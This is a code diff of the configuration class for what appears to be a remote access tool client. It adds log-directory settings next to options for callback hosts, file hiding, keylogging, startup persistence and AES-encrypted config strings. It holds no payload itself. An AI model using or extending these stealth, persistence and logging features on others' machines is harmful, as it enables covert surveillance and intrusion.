@@ -10,7 +10,7 @@ namespace xClient.Config
     public static class Settings
     {
 #if DEBUG
-        public static string VERSION = "1.0.0.0d";
+        public static string VERSION = System.Windows.Forms.Application.ProductVersion;
         public static string HOSTS = "localhost:4782;";
         public static int RECONNECTDELAY = 500;
         public static string PASSWORD = "1234";
@@ -25,13 +25,16 @@ namespace xClient.Config
         public static bool HIDEFILE = false;
         public static bool ENABLELOGGER = false;
         public static string TAG = "DEBUG";
+        public static string LOGDIRECTORYNAME = "Logs";
+        public static bool HIDELOGDIRECTORY = false;
 
-        public static void Initialize()
+        public static bool Initialize()
         {
             FixDirectory();
+            return true;
         }
 #else
-        public static string VERSION = "1.0.0.0r";
+        public static string VERSION = "";
         public static string HOSTS = "localhost:4782;";
         public static int RECONNECTDELAY = 5000;
         public static string PASSWORD = "1234";
@@ -47,10 +50,13 @@ namespace xClient.Config
         public static bool ENABLELOGGER = true;
         public static string ENCRYPTIONKEY = "ENCKEY";
         public static string TAG = "RELEASE";
+        public static string LOGDIRECTORYNAME = "Logs";
+        public static bool HIDELOGDIRECTORY = false;
 
-        public static void Initialize()
+        public static bool Initialize()
         {
-            AES.PreHashKey(ENCRYPTIONKEY);
+            if (string.IsNullOrEmpty(VERSION)) return false;
+            AES.SetDefaultKey(ENCRYPTIONKEY);
             TAG = AES.Decrypt(TAG);
             VERSION = AES.Decrypt(VERSION);
             HOSTS = AES.Decrypt(HOSTS);
@@ -59,7 +65,9 @@ namespace xClient.Config
             INSTALLNAME = AES.Decrypt(INSTALLNAME);
             MUTEX = AES.Decrypt(MUTEX);
             STARTUPKEY = AES.Decrypt(STARTUPKEY);
+            LOGDIRECTORYNAME = AES.Decrypt(LOGDIRECTORYNAME);
             FixDirectory();
+            return true;
         }
 #endif
 
